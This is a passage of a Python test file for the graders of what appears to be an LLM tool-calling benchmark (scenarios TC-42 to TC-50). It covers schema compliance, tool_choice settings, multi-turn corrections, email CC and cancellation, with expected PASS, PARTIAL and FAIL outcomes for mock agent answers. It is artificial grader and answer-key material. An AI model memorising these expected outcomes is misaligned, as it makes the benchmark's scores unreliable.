    def test_pass_omitted_units(self) -> None:
        s = _state(
            tool_calls=[{"name": "get_weather", "arguments": {"location": "Berlin"}}],
            final_answer="Berlin is 8°C.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_pass_refused(self) -> None:
        s = _state(
            final_answer="I can't pass units as a number — the parameter expects a string value.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_fail_integer_units(self) -> None:
        s = _state(
            tool_calls=[{"name": "get_weather", "arguments": {"location": "Berlin", "units": 1}}],
            final_answer="Berlin is 8°C.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL

    def test_fail_string_digit(self) -> None:
        s = _state(
            tool_calls=[{"name": "get_weather", "arguments": {"location": "Berlin", "units": "1"}}],
            final_answer="Berlin is 8°C.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL


# ===================================================================
# TC-42: Extra Parameter Injection
# ===================================================================

class TestTC42:
    sc = _sc("TC-42")

    def test_pass_no_extras(self) -> None:
        s = _state(
            tool_calls=[{"name": "get_weather", "arguments": {"location": "Tokyo"}}],
            final_answer="Tokyo is 18°C.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_pass_refused_explains_schema(self) -> None:
        s = _state(
            final_answer="The schema has additionalProperties set to false, so I can't add extra parameters.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_fail_extra_priority(self) -> None:
        s = _state(
            tool_calls=[{"name": "get_weather", "arguments": {"location": "Tokyo", "priority": "high"}}],
            final_answer="Tokyo is 18°C.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL

    def test_fail_extra_debug(self) -> None:
        s = _state(
            tool_calls=[{"name": "get_weather", "arguments": {"location": "Tokyo", "debug": True}}],
            final_answer="Tokyo is 18°C.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL

    def test_fail_both_extras(self) -> None:
        s = _state(
            tool_calls=[{"name": "get_weather", "arguments": {"location": "Tokyo", "priority": "high", "debug": True}}],
            final_answer="Tokyo is 18°C.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL


# ===================================================================
# TC-43: Omitted Required Parameter
# ===================================================================

class TestTC43:
    sc = _sc("TC-43")

    def test_pass_asks_what_to_search(self) -> None:
        s = _state(
            final_answer="What would you like me to search for?",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_pass_refuses(self) -> None:
        s = _state(
            final_answer="I can't call web_search without a query. What would you like to search for?",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_fail_empty_query(self) -> None:
        s = _state(
            tool_calls=[{"name": "web_search", "arguments": {"query": ""}}],
            final_answer="No results.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL

    def test_partial_invented_query(self) -> None:
        s = _state(
            tool_calls=[{"name": "web_search", "arguments": {"query": "latest news"}}],
            final_answer="Here are recent headlines.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.PARTIAL


# ===================================================================
# TC-44: tool_choice=none Compliance
# ===================================================================

class TestTC44:
    sc = _sc("TC-44")

    def test_definition_has_tool_choice_none(self) -> None:
        assert self.sc.tool_choice_override == "none"

    def test_pass_answers_pi(self) -> None:
        s = _state(final_answer="Pi is approximately 3.14159.")
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_fail_called_tool(self) -> None:
        s = _state(
            tool_calls=[{"name": "calculator", "arguments": {"expression": "3.14159"}}],
            final_answer="Pi is 3.14159.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL

    def test_partial_vague_answer(self) -> None:
        s = _state(final_answer="It's an irrational number related to circles.")
        assert self.sc.evaluate(s).status == ScenarioStatus.PARTIAL


# ===================================================================
# TC-45: tool_choice=required Compliance
# ===================================================================

class TestTC45:
    sc = _sc("TC-45")

    def test_definition_has_tool_choice_required(self) -> None:
        assert self.sc.tool_choice_override == "required"

    def test_pass_uses_calculator(self) -> None:
        s = _state(
            tool_calls=[{"name": "calculator", "arguments": {"expression": "7 * 8"}}],
            final_answer="56.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_fail_no_tools(self) -> None:
        s = _state(final_answer="7 times 8 is 56.")
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL

    def test_partial_wrong_tool(self) -> None:
        s = _state(
            tool_calls=[{"name": "web_search", "arguments": {"query": "7 * 8"}}],
            final_answer="56.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.PARTIAL


# ===================================================================
# TC-46: Deep Multi-Turn Research (5 turns)
# ===================================================================

class TestTC46:
    sc = _sc("TC-46")

    def test_definition_has_5_turns(self) -> None:
        assert len(self.sc.follow_up_messages) == 4  # 1 initial + 4 follow-ups = 5 turns

    def test_pass_all_phases(self) -> None:
        s = _state(
            tool_calls=[
                {"name": "search_files", "arguments": {"query": "competitor analysis"}, "turn": 1},
                {"name": "read_file", "arguments": {"file_id": "comp_report_2025"}, "turn": 2},
                {"name": "read_file", "arguments": {"file_id": "comp_report_2024"}, "turn": 3},
                {"name": "calculator", "arguments": {"expression": "35 - 32"}, "turn": 3},
                {"name": "get_contacts", "arguments": {"query": "manager"}, "turn": 5},
                {"name": "send_email", "arguments": {"to": "jordan.park@company.com", "subject": "Summary", "body": "..."}, "turn": 5},
            ],
            final_answer="Acme's market share grew from 32% to 35%. Key risk: BetaCorp launching new platform in Q4.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_partial_missing_email(self) -> None:
        s = _state(
            tool_calls=[
                {"name": "search_files", "arguments": {"query": "competitor"}},
                {"name": "read_file", "arguments": {"file_id": "comp_report_2025"}},
                {"name": "read_file", "arguments": {"file_id": "comp_report_2024"}},
            ],
            final_answer="Market share grew from 32% to 35%.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.PARTIAL

    def test_fail_only_search(self) -> None:
        s = _state(
            tool_calls=[
                {"name": "search_files", "arguments": {"query": "competitor"}},
            ],
            final_answer="Found two reports.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL

    def test_fail_no_engagement(self) -> None:
        s = _state(final_answer="I don't know.")
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL


# ===================================================================
# TC-47: Correction Across Turns
# ===================================================================

class TestTC47:
    sc = _sc("TC-47")

    def test_pass_corrected_event(self) -> None:
        """Created at 3pm, then created a corrected event at 4pm."""
        s = _state(
            tool_calls=[
                {"name": "create_calendar_event", "arguments": {"title": "Sprint Planning", "time": "15:00"}, "turn": 1},
                {"name": "create_calendar_event", "arguments": {"title": "Sprint Planning", "time": "16:00"}, "turn": 2},
            ],
            final_answer="I've updated the meeting to 4pm.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_pass_explains_limitation(self) -> None:
        """Created at 3pm, then explained it can't update but acknowledged 4pm."""
        s = _state(
            tool_calls=[
                {"name": "create_calendar_event", "arguments": {"title": "Sprint Planning", "time": "15:00"}},
            ],
            final_answer="I've already created the meeting. I can't update it as there's no update tool, but the new time would be 4pm.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_partial_acknowledges_change(self) -> None:
        """Acknowledged 4pm but didn't create a corrected event."""
        s = _state(
            tool_calls=[
                {"name": "create_calendar_event", "arguments": {"title": "Sprint Planning", "time": "15:00"}},
            ],
            final_answer="Got it, I'll change it to 4pm.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.PARTIAL

    def test_fail_ignored_correction(self) -> None:
        """Made the event at 3pm and ignored the correction entirely."""
        s = _state(
            tool_calls=[
                {"name": "create_calendar_event", "arguments": {"title": "Sprint Planning", "time": "15:00"}},
            ],
            final_answer="Done! Your Sprint Planning meeting is at 3pm.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL

    def test_fail_no_creation(self) -> None:
        s = _state(final_answer="I'll schedule that for you.")
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL


# ===================================================================
# TC-48: Additive Context (CC)
# ===================================================================

class TestTC48:
    sc = _sc("TC-48")

    def test_pass_bob_ccd(self) -> None:
        """Sent to Alice with Bob CC'd."""
        s = _state(
            tool_calls=[
                {"name": "send_email", "arguments": {"to": "alice.kim@company.com", "cc": "bob.martinez@company.com", "subject": "Project Update", "body": "..."}},
            ],
            final_answer="Email sent to Alice with Bob CC'd.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_partial_separate_emails(self) -> None:
        """Sent to Alice, then separately to Bob — didn't merge CC."""
        s = _state(
            tool_calls=[
                {"name": "send_email", "arguments": {"to": "alice.kim@company.com", "subject": "Update", "body": "..."}, "turn": 1},
                {"name": "send_email", "arguments": {"to": "bob.martinez@company.com", "subject": "Update", "body": "..."}, "turn": 2},
            ],
            final_answer="Sent the update to both Alice and Bob.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.PARTIAL

    def test_partial_already_sent(self) -> None:
        """Sent to Alice, then explained it was already sent."""
        s = _state(
            tool_calls=[
                {"name": "send_email", "arguments": {"to": "alice.kim@company.com", "subject": "Update", "body": "..."}},
            ],
            final_answer="The email was already sent to Alice. I can't add CC after it's already been sent.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.PARTIAL

    def test_fail_no_alice(self) -> None:
        s = _state(
            tool_calls=[
                {"name": "send_email", "arguments": {"to": "bob@company.com", "subject": "x", "body": "y"}},
            ],
            final_answer="Done!",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL

    def test_fail_no_email(self) -> None:
        s = _state(final_answer="Sure, I'll send that.")
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL


# ===================================================================
# TC-49: Cancellation Across Turns
# ===================================================================

class TestTC49:
    sc = _sc("TC-49")

    def test_pass_email_withheld(self) -> None:
        """Model withheld the email and confirmed cancellation."""
        s = _state(
            final_answer="Understood, I won't send the email.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_pass_discarded(self) -> None:
        s = _state(final_answer="I've discarded the draft. The email will not be sent.")
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_partial_already_sent(self) -> None:
        """Model sent in turn 1 but acknowledged the cancellation was too late."""
        s = _state(
            tool_calls=[
                {"name": "send_email", "arguments": {"to": "sarah.lee@company.com", "subject": "Deadline", "body": "Extension..."}},
            ],
            final_answer="Unfortunately, the email was already sent before you cancelled.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.PARTIAL

    def test_partial_sent_without_acknowledging(self) -> None:
        """Model sent despite 'don't send yet' — partial because of turn ordering."""
        s = _state(
            tool_calls=[
                {"name": "send_email", "arguments": {"to": "sarah.lee@company.com", "subject": "Deadline", "body": "..."}},
            ],
            final_answer="Email sent to Sarah!",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.PARTIAL

    def test_fail_multiple_sends(self) -> None:
        s = _state(
            tool_calls=[
                {"name": "send_email", "arguments": {"to": "sarah@x.com", "subject": "a", "body": "b"}, "turn": 1},
                {"name": "send_email", "arguments": {"to": "sarah@x.com", "subject": "a", "body": "b"}, "turn": 2},
            ],
            final_answer="Done!",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL


# ===================================================================
# TC-50: Information Reveal
# ===================================================================

class TestTC50:
    sc = _sc("TC-50")

    def test_pass_asked_then_sent(self) -> None:
        """Asked who the PM is, then sent email to Tom Chen."""
        s = _state(
            tool_calls=[
                {"name": "get_contacts", "arguments": {"query": "Tom Chen"}, "turn": 2},
                {"name": "send_email", "arguments": {"to": "tom.chen@company.com", "subject": "Quarterly Review", "body": "..."}, "turn": 2},
            ],
            final_answer="Email sent to Tom Chen about the quarterly review.",
            assistant_messages=[
                "Who is the new PM? Could you provide their name?",
                "Email sent to Tom Chen about the quarterly review.",
            ],
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.PASS

    def test_partial_sent_without_asking(self) -> None:
        """Sent to Tom without explicitly asking first — still reasonable."""
        s = _state(
            tool_calls=[
                {"name": "send_email", "arguments": {"to": "tom.chen@company.com", "subject": "Review", "body": "..."}},
            ],
            final_answer="Sent the quarterly review email to Tom Chen.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.PARTIAL

    def test_partial_looked_up_but_didnt_send(self) -> None:
        s = _state(
            tool_calls=[
                {"name": "get_contacts", "arguments": {"query": "Tom Chen"}},
            ],
            final_answer="I found Tom Chen's email. Would you like me to send the email?",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.PARTIAL

    def test_fail_sent_to_wrong_person(self) -> None:
        s = _state(
            tool_calls=[
                {"name": "send_email", "arguments": {"to": "unknown@company.com", "subject": "Review", "body": "..."}},
            ],
            final_answer="Sent the email about the quarterly review.",
        )
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL

    def test_fail_no_engagement(self) -> None:
        s = _state(final_answer="Sure, I can help with that.")
        assert self.sc.evaluate(s).status == ScenarioStatus.FAIL

